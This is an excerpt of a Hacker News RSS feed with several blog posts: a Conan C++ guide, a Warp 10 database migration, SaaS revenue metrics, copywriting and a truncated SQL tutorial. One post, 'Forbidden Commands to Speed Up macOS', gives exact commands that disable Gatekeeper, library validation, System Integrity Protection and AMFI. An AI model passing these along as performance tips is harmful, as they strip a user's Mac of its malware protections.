<![CDATA[Beginner guide to Conan package manager for C++]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25084174">thread link</a>) | @motbus3
<br/>
November 13, 2020 | https://fsan.github.io/post/til_conan_01/ | <a href="https://web.archive.org/web/*/https://fsan.github.io/post/til_conan_01/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

<p>Just enought information to get you started with Conan.</p>

<p>Package managing for C++ is quite difficult, specially while working of several different projects with different dependencies.
The objective of conan is to provide some package management for this situation. It is pretty similar in concept to pip and npm but it does also provide some extra functionalities such as <strong>generators</strong>.</p>

<h2 id="installing-conan">Installing Conan</h2>

<p>Installing conan is simple. Only pip install it.
I particularly do not like to add stuff to my base pip environment and as I regularly experiment with other tools I usually create environments for this kind of stuff. I used conda to create my environment, but it is totally optional.</p>
<div><pre><code data-lang="fallback">conda create -n cpp_env python=3.8

pip install conan</code></pre></div>
<h2 id="basic-usage">Basic usage</h2>

<h3 id="finding-packages">Finding packages</h3>

<p>Locally:</p>
<div><pre><code data-lang="fallback">conan search &lt;package_name&gt;</code></pre></div>
<p>Conan Center</p>
<div><pre><code data-lang="fallback">conan search &lt;package_name&gt; --remote=&lt;remote_name&gt;

# example
conan search opencv --remote=conan-center</code></pre></div>
<p>If you wish you may use it’s web interface: <a href="https://conan.io/center">https://conan.io/center</a></p>

<p>To list the package properties:</p>
<div><pre><code data-lang="fallback">conan inspect &lt;package_name&gt; --remote=&lt;remote_name&gt;

# example
conan inspect opencv/4.3.0@conan/stable --remote=conan-center</code></pre></div>
<h3 id="installing-other-repositories">Installing other repositories</h3>

<p>Some packages may not be available from Conan source or may have only its binary distributed (or maybe you wish to get the precompiled binaries). You can add other remotes as adding <strong>bincrafters</strong> below:</p>
<div><pre><code data-lang="fallback">conan remote add bincrafters https://api.bintray.com/conan/bincrafters/public-conan</code></pre></div>
<p>More info at <a href="https://bincrafters.github.io/2017/06/06/using-bincrafters-conan-repository/">BinCrafters</a></p>

<p>To list available remotes</p>

<h3 id="creating-package-list">Creating  package list</h3>

<p>You should create a $conanfile.txt$ in your project. It will have similar function as requirements.txt for python or packages.json for node.</p>
<div><pre><code data-lang="fallback">[requires]
openssl/1.0.2s
opencv/4.3.0@conan/stable
sdl2/2.0.12@bincrafters/stable

[generators]
cmake</code></pre></div>
<p>Risking to state the obvious, requires define what packages you want and generators will allow you to create the files for building from cmake, visual studio, premake, make, etc…</p>

<p>An important reference for this is <a href="https://docs.conan.io/en/latest/reference/generators.html#generators-reference">Conan Generators page</a></p>

<p>There are some useful generators for documenting your application such as <a href="https://docs.conan.io/en/latest/reference/generators/markdown.html">markdown</a> that might be worth checking.</p>

<h3 id="download-dependencies-and-creating-configuration-files">Download dependencies and creating configuration files</h3>

<p>For organization it is usually nice to have build files inside a separate folder (usually $build$).
So if your $conanfile.txt$ is at the root of your project you would run</p>

<p>But if prebuilt binaries are not available you will receive an “BinaryMissing” error. So you would need build the dependencies as:</p>
<div><pre><code data-lang="fallback">conan install .. --build=missing</code></pre></div>
<h2 id="building-the-application">Building the application</h2>

<p>You may be using other building systems, but for this TIL I will use cmake because it’s what I have here.
For CMake you will need a $CMakeLists.txt$. As we previously added cmake generator, conan will create a $conanbuildinfo.cmake$ so we need to include it in our cmake configuration at the root of our src.</p>
<div><pre><code data-lang="fallback">cmake_minimum_required(VERSION 3.10)

project(example_app)
add_definitions("-std=c++14")

include(${CMAKE_BINARY_DIR}/conanbuildinfo.cmake)
conan_basic_setup()

# add the executable
add_executable(example_app main.cpp)
target_link_libraries(example_app ${CONAN_LIBS})</code></pre></div>
<p>Now from the build folder</p>

<p>If everything is fine with your dependencies your application should be built.</p>

		</div></div>]]>
            </description>
            <link>https://fsan.github.io/post/til_conan_01/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084174</guid>
            <pubDate>Fri, 13 Nov 2020 16:50:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gaia-X Summit]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25084065">thread link</a>) | @simonebrunozzi
<br/>
November 13, 2020 | https://events.talque.com/gaia-x-summit/en/6iq6yI5LPSxaIRA6cmnq | <a href="https://web.archive.org/web/*/https://events.talque.com/gaia-x-summit/en/6iq6yI5LPSxaIRA6cmnq">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://events.talque.com/gaia-x-summit/en/6iq6yI5LPSxaIRA6cmnq</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084065</guid>
            <pubDate>Fri, 13 Nov 2020 16:42:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Forbidden Commands to Speed Up macOS]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25083934">thread link</a>) | @rubatuga
<br/>
November 13, 2020 | https://www.naut.ca/blog/2020/11/13/forbidden-commands-to-liberate-macos/ | <a href="https://web.archive.org/web/*/https://www.naut.ca/blog/2020/11/13/forbidden-commands-to-liberate-macos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>November 13, 2020<span> · <a href="https://www.naut.ca/blog/tag/macos/">macos</a> <a href="https://www.naut.ca/blog/tag/software/">software</a> <a href="https://www.naut.ca/blog/tag/diy/">diy</a></span></p></div><div><p><img src="https://www.naut.ca/blog/content/images/2020/11/Screen-Shot-2020-11-13-at-2.02.01-AM.jpg" alt="Screen-Shot-2020-11-13-at-2.02.01-AM"><br>
First, ask yourself, would you like to undo a decade of security protections painstakingly created by Apple, protecting your Mac from malware, spyware, and ransomware? What if these so-called <em>protections</em> prevented the normal and speedy usage of your Mac? See exhibits: [<a href="https://news.ycombinator.com/item?id=25074959">A,</a> <a href="https://news.ycombinator.com/item?id=23273247">B,</a> <a href="https://github.com/microsoft/vscode/issues/105446#issuecomment-722264044">C,</a> <a href="https://github.com/johnboiles/obs-mac-virtualcam/wiki/Compatibility#sip-workaround">D,</a> <a href="https://github.com/MacEnhance/MacForge">E,</a> <a href="https://lapcatsoftware.com/articles/unsigned.html">F</a>]</p>
<p>Is that a yes? <strong>Speed and convenience over security any day!</strong> Let us march on boldly 😃! The steps listed below will give you a short description of each protection we disable, and the necessary command in Terminal.</p>
<h4 id="stepbystepguide">Step-by-step Guide</h4>
<p><strong>Step 1: Disable GateKeeper.</strong> This is the part of macOS that deals with code signature validation. It checks if the app in question was signed by the creator, and then checks whether Apple has given the creator a thumbs-up. macOS 10.15 made this much more stringent, requiring Apple to give <em>each app</em> a thumbs-up.</p>
<pre><code>sudo spctl --master-disable
</code></pre>
<p><strong>Step 2: Disable Library Validation.</strong> This protection checks if an app's libraries are signed by Apple or the creator. Until very recently, macOS apps could load code freely from foreign sources called <em>code libraries</em>. With macOS 10.15, apps are no longer allowed to load libraries that weren't originally packaged with it, unless they explicitly allow it.</p>
<pre><code>sudo defaults write /Library/Preferences/com.apple.security.libraryvalidation.plist DisableLibraryValidation -bool true
</code></pre>
<p><strong>Step 3: Disable System Integrity Protection.</strong> <em>You have to enter Recovery Mode (by holding Command+R while rebooting) in order to disable SIP. This mode lets us change boot data for the Mac.</em> SIP prevents both malware and power-users alike from modifying the system files, core apps, and the kernel of macOS. It does this by only allowing apps and extensions signed by Apple to modify the system.</p>
<pre><code># From the Recovery Mode menubar: Utilities --&gt; Terminal
csrutil disable
</code></pre>
<p><strong>Step 4: Disable Apple Mobile File Integrity.</strong> AMFI is the macOS kernel module that enforces the code-signing validation from Step 1 and the library validation from Step 2. However, even after disabling the services above, AMFI is still checking the signatures of every app that is run, and will cause non-Apple apps to crash when they touch extra-sensitive areas of the system.</p>
<pre><code># While still in Recovery Mode
nvram boot-args="amfi_get_out_of_my_way=1"
</code></pre>
<p><strong>Step 5: Reboot &amp; Enjoy Liberty.</strong> No explanation required.</p>
<h4 id="caveats">Caveats:</h4>
<ul>
<li>If GateKeeper is enabled while AMFI is disabled, some apps will hang while opening.</li>
<li>If AMFI is disabled, prompts to allow apps access to the camera, microphone, accessibility etc. will not be shown. The <code>tccplus</code> utility, found <a href="https://github.com/jslegendre/tccplus">here</a>, alleviates this (there is a GUI script in the repo).</li>
</ul>
<h4 id="furtherreading">Further Reading:</h4>
<ul>
<li><a href="https://knight.sc/reverse%20engineering/2019/02/20/syspolicyd-internals.html">syspolicyd internals</a></li>
<li><a href="https://eclecticlight.co/2019/10/10/how-catalina-handles-app-first-run/">How Catalina handles app first run</a></li>
<li><a href="https://eclecticlight.co/2020/01/27/what-could-possibly-go-wrong-on-an-app-first-run/">What could possibly go wrong on an app first run?</a></li>
<li><a href="https://eclecticlight.co/2018/12/29/amfi-checking-file-integrity-on-your-mac/">AMFI: checking file integrity on your Mac</a></li>
<li><a href="http://www.newosxbook.com/articles/CodeSigning.pdf">Code Signing – Hashed Out, RSA Conference</a></li>
<li><a href="https://secret.club/2020/08/14/macos-entitlements.html">Abusing MacOS Entitlements for code execution</a></li>
</ul>
<h4 id="addendum">Addendum:</h4>
<p>Unfortunately, my article was flagged by some users after getting on the front page of Hacker News! I guess they just didn't appreciate the humour? However, you can check out <a href="https://news.ycombinator.com/item?id=25083934">the discussion</a> before it was taken down.</p>
</div></div>]]>
            </description>
            <link>https://www.naut.ca/blog/2020/11/13/forbidden-commands-to-liberate-macos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083934</guid>
            <pubDate>Fri, 13 Nov 2020 16:29:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating 38TB from one TSDB to another is easy]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25083644">thread link</a>) | @MorganeR
<br/>
November 13, 2020 | https://blog.senx.io/warp-10-migration/ | <a href="https://web.archive.org/web/*/https://blog.senx.io/warp-10-migration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Migration of 38TB of data from a Warp 10 server to another. How can you do this? Is it more complex than migration of a 38TB SQL database?</p><article>
      
<p>The migration of a database from a server to a new one can be painful. </p>



<p>Recently, this article describing <a href="https://www.tarynpivots.com/post/migrating-40tb-sql-server-database/" target="_blank" rel="noreferrer noopener">how to migrate a 40TB SQL database</a> to another SQL database caught my attention. </p>



<p>It took the author huge efforts to migrate what looks like time series (HAProxy traffic logs). Using <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10</a> in the same situation, migration would have been a lot simpler.</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/11/schema_migrate.jpg" alt="infographic about the migration from a Warp 10 database to another one" width="553" height="232" srcset="https://blog.senx.io/wp-content/uploads/2020/11/schema_migrate.jpg 722w, https://blog.senx.io/wp-content/uploads/2020/11/schema_migrate-300x126.jpg 300w" sizes="(max-width: 553px) 100vw, 553px"></figure></div>



<h2>The plot</h2>



<p>For years, you are storing data on a Warp 10 standalone version. You reached the limit of the disk space, there is just a few TB remaining on 40TB. You do not want to delete anything. For this application, you just have one token.</p>



<pre>host: oldserver
Warp 10 port: 8080
read token: OldReadToken</pre>



<p>You bought 10 new servers, and you decided to jump to Warp 10 distributed version. Everything is ready for production.</p>



<pre>ingress host: newserver
Warp 10 port: 8080
write token: NewWriteToken</pre>



<h2>The migration</h2>



<p><strong>1/</strong> Redirect your traffic log output to the new server. </p>



<p><strong>2/</strong> If there are not on the same network, set a tunnel between the old server and the new one. The most bandwidth the better.</p>



<p><strong>3/</strong> Launch curl:</p>



<pre><code>curl  -H 'X-Warp10-Token: OldReadToken' "http://oldserver:8080/api/v0/fetch?start=1970-01-01T00%3A00%3A00.000Z&amp;stop=2020-11-16T00%3A00%3A00.000Z&amp;selector=~.*%7B%7D&amp;format=text&amp;dedup=false" | curl -T - -H 'Transfer-Encoding: chunked' -H 'X-Warp10-Token: NewWriteToken' 'http://newserver:8080/api/v0/update'</code></pre>



<p>Basically, read all from 1970 to now, and push it to the new server. </p>



<blockquote><p>You do not need any extra disk space. You do not need a lot of RAM either, thanks to chunking. </p></blockquote>



<p><strong>4/</strong> Wait...</p>



<p>During my tests between two old computers on my local network, with 7GB in LevelDB directory, it took 50 minutes to output 36GB, at a 12MB/s speed. WiFi was not the limit.</p>



<pre>% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 36.3G    0 36.3G    0     0  12.2M      0 --:--:--  0:50:33 --:--:-- 11.2M</pre>







<p>On a gigabit network, the limit may be your old server output. Depending on your hardware, you will surely reach 50MB/s. </p>



<p>Let's extrapolate:</p>



<figure><table><tbody><tr><td></td><td>Small test</td><td>Serious one</td></tr><tr><td>LevelDB size</td><td>7GB</td><td>38TB</td></tr><tr><td>Datapoints</td><td>575M</td><td>~3.1 T</td></tr><tr><td>Text size</td><td>36GB</td><td>~194TB</td></tr><tr><td>Curl speed</td><td>12.2MB/s</td><td>~50MB/s</td></tr><tr><td>Time</td><td>50 minutes</td><td>~45 days</td></tr><tr><td></td><td></td><td></td></tr></tbody></table></figure>



<p>In my test dataset, there is a lot of <strong><a href="https://blog.senx.io/working-with-geo-data-in-warp-10/" target="_blank" rel="noreferrer noopener">geo time series</a></strong>, with location and elevation. <strong>Your data may be denser, and it will take less than 45 days with just a curl command</strong>. You may cut time in half and use two threads to do the migration. With spinning disks, more thread will increase seeking time anyway. </p>



<p>Now, read <a href="https://www.tarynpivots.com/post/migrating-40tb-sql-server-database/" target="_blank" rel="noreferrer noopener">the article</a> that retains my attention... 40 TB SQL database to move: <strong>11-month project. Tons of specific scripts. Lots of development hours.</strong> 8437 words in the blog article. 40 min estimated time to read the article!</p>



<h2>Q/A</h2>



<p><em><strong>Q:</strong> I have several tokens on my database!</em></p>



<p><strong>A:</strong> Assuming you also recreated tokens on your new server, iterate on them in a curl. If your new server shares the same secrets, the tokens will be the same, and migration will be easier. If you are <a href="https://blog.senx.io/all-there-is-to-know-about-warp-10-tokens/" target="_blank" rel="noreferrer noopener">familiar with tokens</a>, you can create some super read/write tokens too.</p>







<p><em><strong>Q:</strong> I want to migrate Warp 10 standalone to another Warp 10 standalone, not to a distributed one!</em></p>



<p><strong>A</strong>: Copy all Warp 10 files from the old server to the new one using Rsync. Then stop the old server. run rsync again (it should take just a few minutes). Start Warp 10 on the new server. Enjoy. </p>







<p><em><strong>Q:</strong> I don't want any service interruption!</em></p>



<p><strong>A:</strong> <a href="https://senx.io/contact" target="_blank" rel="noreferrer noopener">Contact us</a>. There are some solutions.</p>







<p><em><strong>Q:</strong> Bandwith is an issue for me. Can't we compress text?</em></p>



<p><strong>A:</strong> Sure you can! Pipe output to gzip before piping to the second curl, and add the correct content-type header to the second curl: <code>-H 'Content-Type: application/gzip'</code>. </p>







<h2>Conclusion</h2>



<p>I feel your disappointment. Just a little 600 words article. There is not even a complex WarpScript or a huge shell script to explain. I am sorry. The migration of Warp 10 to Warp 10 is just too simple.</p>



<figure></figure>




<!-- relpost-thumb-wrapper --><!-- close relpost-thumb-wrapper -->      
           
    </article></div>]]>
            </description>
            <link>https://blog.senx.io/warp-10-migration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083644</guid>
            <pubDate>Fri, 13 Nov 2020 16:05:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Organize screenshots, images and bookmarks in the browser's address bar]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25083464">thread link</a>) | @ghostffcode
<br/>
November 13, 2020 | https://pageverse.app/pocket | <a href="https://web.archive.org/web/*/https://pageverse.app/pocket">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>
          A browser extension to manage &amp; organize screenshots 📸, images 🖼️,
          text snippets 🗒️ &amp;
          bookmarks
          🔖 with ease.
        </p>

        <div>
          <p><a href="https://pageverse.app/install">
            Add Pocket
          </a>
          <a href="#watchModal" data-toggle="modal">
            <em data-feather="play" width="20" height="20"></em>
            How it works
          </a>
        </p></div>
      </div></div>]]>
            </description>
            <link>https://pageverse.app/pocket</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083464</guid>
            <pubDate>Fri, 13 Nov 2020 15:50:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[“The Leaky Bucket” Why You Need to Be Careful with Net Revenue Retention]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25083443">thread link</a>) | @randrews543
<br/>
November 13, 2020 | https://talkinsaasy.com/blog/why-you-need-to-be-careful-with-net-revenue-retention | <a href="https://web.archive.org/web/*/https://talkinsaasy.com/blog/why-you-need-to-be-careful-with-net-revenue-retention">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" id="item-5f8dc14035acad70dfe74487"><div><div><div data-block-type="2" id="block-7938932fe95bcf658f19"><div><p>We will be the first one to tell you we love a great revenue retention breakdown. For most early-stage startups looking at revenue retention can reveal a treasure trove of information about how your customer are behaving, how they like your product, and how long they stick around. Net Revenue Retention (NRR for short) is one of the most popular and commonly discussed metrics for recurring revenue/subscription startups and is typically used as a measuring stick for the health of a companies revenue stream. The issue being simply looking at the top line retention percentage can be misleading, we will explain…</p><p>First, we want to review the formula for NRR which you can always find in our <a href="https://talkinsaasy.com/saasy-math" target="_blank">SaaSy Math</a> resource:</p><p><strong>Formula: </strong>(Initial MRR - Churned (Cancelled) MRR - Downgrade MRR + Expansion (Upsell or X-Sell) MRR) / Initial MRR</p><p>Net Revenue Retention is used to calculate how much revenue from businesses, or particular group of their customers, is left after their initial purchase. It is meant to be a pulse check for recurring revenue businesses to assess how sticky their product or service is, do they have product-market fit, and how the economics of their product or service performs in the market. Long story short, do you customers pay you enough and stick around long enough for this business to become profitable.</p><p>In theory the higher NRR the better. A startup with 110% annual NRR versus 90% annual NRR is retaining 20% more revenue and therefore in the short term seems like a better bet for growth and success. The issue becomes when you look at the components of those 110% and 90% retention numbers.</p><p>The formula for NRR contains churned and downgraded revenue as well as expansion revenue. Churned/downgrade revenue is the result of customers either canceling their subscription or knocking down the amount they buy from you, either way it results in lost revenue and potentially lost customers. Expansion revenue is the result of customers with an initial subscription either upgrading their plan, adding more licenses or products, or buying an additional SKU.</p><p>Let’s say that the 110% NRR startup lost 20% of their revenue to churn, 5% to downgrades and 35% of it was the result of expansion/upgrades. Great right?!? Then we look at the 90% NRR startup with 5% churn, 10% downgrades and 5% expansion/upgrades. What is going on here?</p><p>For our 110% NRR startup in the short term revenue retention is growing which looks great on paper at the top line. The issue becomes those massive churn numbers. 35% revenue expansion/upgrade is great, unless you are churning 20% of your revenue each month, why? With that high of revenue churn you quickly will find yourself losing bad-fit customers so fast that you eventually will run out of accounts to upsell too. Once that happens and your 35% revenue expansion suddenly drops to 5-10% because you have already upgraded all the best accounts your overall NRR will plummet to 80-85% which is not a great sign for a recurring revenue business. We call this a “false bottom” where a startup masks a churn issue by driving upsells in the accounts that do stick around.</p><p>Now, this isn’t all doom and gloom, both startups in this case could succeed, you just need to look at the data and make the necessary adjustments to address what the data is telling you. For the 110% net retention startup. They need to isolate the 35% of accounts that upgraded. Clearly these are customers that you have strong product-market fit, take what you know about them and use it to put a marketing and sales plan in place to attract more customer that match their profile and next thing you know that churn number will shrink instead and the businesses revenue retention will only improve.</p><p>Net Revenue Retention is a powerful metric to assess the health of early-stage recurring revenue startups. Startups and investors alike need to be careful when reporting or making decisions on top-line retention numbers though because they can sometimes not tell the whole story. Breaking revenue retention down into the components that make up its whole can help you better analyze the long term trajectory of a startup and diagnose potential solutions to any shortcomings. </p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://talkinsaasy.com/blog/why-you-need-to-be-careful-with-net-revenue-retention</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083443</guid>
            <pubDate>Fri, 13 Nov 2020 15:47:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get Better at Copywriting]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25083187">thread link</a>) | @KlimYadrintsev
<br/>
November 13, 2020 | https://klimy.co/blog/an-excuse-to-not-finish-13-11-2020 | <a href="https://web.archive.org/web/*/https://klimy.co/blog/an-excuse-to-not-finish-13-11-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <h2>Notes are fun, and Blog is work</h2>
<p>Let me get something straight.</p>
<p>When I write, I really know when I hit the good story or something I can elaborate and create a nice and fully-fledged blog post. </p>
<ol>
<li>It is either that I can feel that my writing is angling a specific way, or that my brain has 2 more topics in mind that I want to cover for the specific blog article. This means that it would be a waste to store it in the Notes section as mostly I use them for short musings, such as this one.</li>
<li>Also, the blog posts require more work and are more specific with what I want to write.</li>
<li>They have a better structure where they have bullet points, lists and such. (This is a huge part that I am underutilising even to today in my writing)</li>
</ol>
<h2>Structure to text</h2>
<p>I think that people really underestimate what you can do with text.</p>
<p>Some of the functions and representations that you can get out of the text are basically amazing nowadays. There is a common understanding and structure with what you can use and how to represent it.</p>
<p>The best part that you can use it <strong>at any points</strong> and <em>in any text you want.</em> It won’t look bad, and it won’t ~fil~ feel wrong or incorrect.</p>
<p>Text representation only improves your style and cohesion to the reader, and if you are not using specific tools, you are shooting yourself in the foot.</p>
<p>I think that we gotta be more structured in our writing if we want to get better cohesion. That is the best way to go about it.</p>
<p>One of the least underused mediums is images, gifs and <strong>especially emojis</strong> 🌝</p>
<p>Look at Instagram comments and how they changed since the rise of it in the last 6 years.</p>
<p>There are little to no words, and the comments always, always include emojis. The more light-headed content is, the more emojis there are. Even Instagram gives you an option to pick out of the list of emojis straight away as it is <strong>that</strong> common to comments with emojis. 👀</p>
<p>Don’t be afraid that your content won’t be serious or mature enough if you use emojis. It will be perfect. Just use them at the right place and in the writing structure.</p>
<p>I think the best example I saw was from @levelsio and his Makers book with titles with emojis 📕.</p>
<h2>Experiment 👨‍🔬</h2>
<p>Hey! Title with emojis! Cool.</p>
<p>Just try things and get feedback. That way, you will be able to understand how and why people react to specific things.</p>
<p>Do things and learn from them.</p>
<p>Start now. Get perfect Later.</p>
<p>Klim Y</p> 
                    
                </div></div>]]>
            </description>
            <link>https://klimy.co/blog/an-excuse-to-not-finish-13-11-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083187</guid>
            <pubDate>Fri, 13 Nov 2020 15:24:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SQL as Sculpture – An Intuitive Way to Understand Queries]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25083167">thread link</a>) | @coolgeek
<br/>
November 13, 2020 | https://www.srsoterica.com/articles/database/sql_as_sculpture | <a href="https://web.archive.org/web/*/https://www.srsoterica.com/articles/database/sql_as_sculpture">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>


<p>
If you look at it from the right perspective - from way up high - you can say that sculpting, the activity of creating a sculpture, is about just two things:
</p>


<ol>
<li>Assembling a mass of material (aka your medium)</li>
<li>Carving that material down</li>
</ol>


<p>
Okay.  Maybe that's a little too high, a little too abstract.  
How about if we zoom in <em>just a bit</em> closer...  
</p>



<p>
A sculpture is often made of clay.  
Depending on how large you intend your sculpture to be, you might be able to find a single clay block big enough to suit your need.  
But if you can't - if you need a block that's larger than that - then you need to do two things:
</p>

<ol>
<li>acquire multiple blocks</li>
<li>mush all of those blocks together as a single (larger) block</li>
</ol>


<p>
After you have assembled your block(s), you will use a variety of tools to carve, or whittle the block down.  
You start with coarser tools that carve off big chunks.  
You work your way toward more delicate tools that make barely perceptible refinements.  
Eventually, a sense of perfection overtakes you and you jubilantly bellow:  
</p>

<h3><em>Finis!</em></h3>



<p>
This carving - painstaking craftsmanship - is sometimes described as finding (or even freeing) the fully formed sculpture that is hidden within (that inherently exists in) the material.  
On the one hand, that's an <em>amazing</em> way to think about carving a sculpture.  
On the other hand, it depresses me - because I lack such insight, myself.  
</p>

<p>
Or... maybe I don't.  Maybe I only lack it in an artistic context.  
</p>

<p>
What might it look like if we considered writing a SQL statement - a query, a SELECT statement - as an act of sculpting, of creating a sculpture?
</p>


<br>
<hr>
<br>
<h2>Assembling Your Data</h2>




<p>
The first thing you need to do in making... um... a... data sculpture... is to assemble your material.  
</p>

<p>
In SQL, your medium is sets of data.  
Note that I <em>did not</em> say that your medium is data.  I said that it is <em>sets</em> of data.  
That is an <em>essential</em> distinction that is lost on a lot of would be relational database users.  
</p>

<p>
A database is a set of tables.  
A table is a set of rows.  
A row is a set of fields (column values).  
A query (a SELECT statement) returns a result set.  That result set is structurally equivalent to a table - it is a set of zero or more rows, each of which is a set of one or more fields.
</p>

<p>
We can think of a table (a set of rows) as a block of data, sort of like a block of clay.  
In doing so, we're getting more abstract again.  But this time it helps us to build our intuition.
</p>



<p>
If you think of tables as blocks of data, then you can think of every SELECT statement as starting with an initial or primary block of data.  
Your primary block of data is the table that you name in the FROM clause.  
For example, here we retrieve all of the fields, in all of the rows, from a primary block of data (a table) named flashcards.  
</p>

<br>
<pre><code>SELECT * FROM flashcards;</code>
</pre>


<p>
Sometimes we need more than one block of data.  
This will be the case when our primary table does not have all of the data that we need - we need some of the rows, or some of the columns, from some other table(s).  
This poses two challenges:  
</p>

<ul>
<li>arranging the blocks (tables) sensibly</li>
<li>mushing the blocks (tables) together</li>
</ul>

<p>
But before we can do these things, we need to think about what the blocks might look like.
</p>

<p>
When we work with clay, we can expect that the blocks we mush together will all be of the same size and shape.  
If they're not, it really doesn't matter - because it's just clay.  
One blob of clay is (mostly) indistinguishable from any other.
</p>

<p>
When we work with data, though, we usually don't have that expectation.  
Most of the time, the other blocks (tables) we need are a different shape than our primary block.  
By the shape of a table, we mean the set of columns that define the table.  
If two tables are defined with the same set of columns, we can say that the tables are of the same shape.  
If they differ in any way, column-wise, we say that the tables are differently shaped.  
</p>


<br>
<h3>Arranging and Mushing Data Blocks of the Same Shape</h3>

<p>
When you have data blocks (tables) of the same shape, you can (you <em>must</em>) stack them on top of each other.  
You can do this because the columns align - each data block (table) has the same columns, in the same order, as all of the others.  
Each column in a data block can thus support its corresponding column in any data block(s) stacked above it.
</p>


<p>
Recall, as I said before, though, that a result set is equivalent to a table.  
That doesn't just mean that a result set <em>looks</em> like a table.  
It also means that we can <em>treat</em> a result set like a table.  
This is a <em>crucial</em> characteristic of result sets, because I wasn't quite precise in the last paragraph.  
You cannot actually stack <em>tables</em> on top of each other in a query.  
But you can stack <em>result sets</em>.  
And that gets us to the same place.  
</p>


<p>
We thus arrange and mush (stack) identically shaped data blocks (result sets) in what we call a union operation.  
We do this simply by inserting the UNION keyword in between two queries.  
</p>

<p>
For example, here we will stack a result set from querying a QA/staging table (flashcards_qa) below a result set from querying our primary (flashcards) table.  
</p>

<br>
<pre><code>SELECT * FROM flashcards
UNION 
SELECT * FROM flashcards_qa;</code>
</pre>


<p>
The UNION operator is used to stack two result sets, one on top of the other.  
It gathers together the rows returned by one query with those returned by another query, merging them all together into a single, larger result set.  
</p>

<p>
We can (we <em>should</em>) think of a UNION operation as adding more rows (but not more columns) to our primary block of data.  It makes the primary block taller (but not wider).
</p>

<p>
There's not much else to arranging and mushing together data blocks of the same shape.  
But you don't have to stop at two blocks.  
You can stack as many queries as you want, as long as the result set from each query is of the same shape - the same set of fields - as all of the others.
</p>



<br>
<h3>Arranging and Mushing Data Blocks of Different Shapes</h3>

<p>
When you have data blocks (tables) of different shapes, you cannot stack them on top of each other.
You cannot do so because their columns can't align.  
As such, your only option for arranging them is to lay them next to each other, side-by-side.
</p>

<p>
But we need to make one thing clear before we get to the how.  
Although these tables each have a different set of columns, they do have to have <em>at least one</em> column that is common between them - a column of the same semantic type (and the same data type).  
This is often an identifier field, such as a user_id number, or a purchase_id number.  But it could be anything - a date field, or even a text field.  
If the two tables do not have any common column(s) at all (one or more, of the same semantic type), <em>they cannot be mushed together</em>, under any circumstances.
</p>

<p>
Assuming we're good on that front, we arrange and mush differently shaped tables in what we call a table join operation.  
We append the JOIN keyword to our query's FROM clause, along with the name of the table we want to add columns from.  
Then we use the ON keyword to tell the DBMS how the tables are related.  
</p>

<p>
For example, here we will join the columns from a table named scores to those of our flashcards table.  
Both tables have a card_id field.
</p>

<br>
<pre><code>SELECT *
FROM flashcards
    JOIN scores
        ON flashcards.card_id = scores.card_id;</code>
</pre>


<p>
We can (we <em>should</em>) think of a table join operation as adding more columns to our primary block of data.  It makes our primary data block wider (but not taller).  
</p>

<p>
We're glossing over <em>a lot of detail</em> here.  
But the intuition is simple - laying one or more additional tables alongside your primary table.
</p>

<br>
<hr>
<br>
<h2>Carving Your Data</h2>


<p>
When it comes to carving your data block down to the size and shape you need, it should come as no surprise that you have two categories of choices.  
You can carve down the height of the block - the quantity of rows in the result set.  
Or you can carve down the width of the block - the quantity of fields (column values) in the result set.  
In most cases, you will do both.  
</p>

<p>
A reminder, though, that with the simplest query, we do neither.  
When we select * (an asterisk in the column list), we get all of the fields in the returned rows.  
When our query only includes the SELECT and FROM clauses, we get all of the rows returned from our table(s).  
So this query will retrieve all of the fields, in all of the rows, from our flashcards table:  
</p>

<br>
<pre><code>SELECT *
FROM flashcards;</code>
</pre>


<p>
To carve down the width of our data block - the quantity of fields in the result set - we simply name the columns we want - and only those columns - in the SELECT clause's column list:  
</p>

<br>
<pre><code>SELECT question FROM flashcards;
SELECT question, answer FROM flashcards;</code>
</pre>


<p>
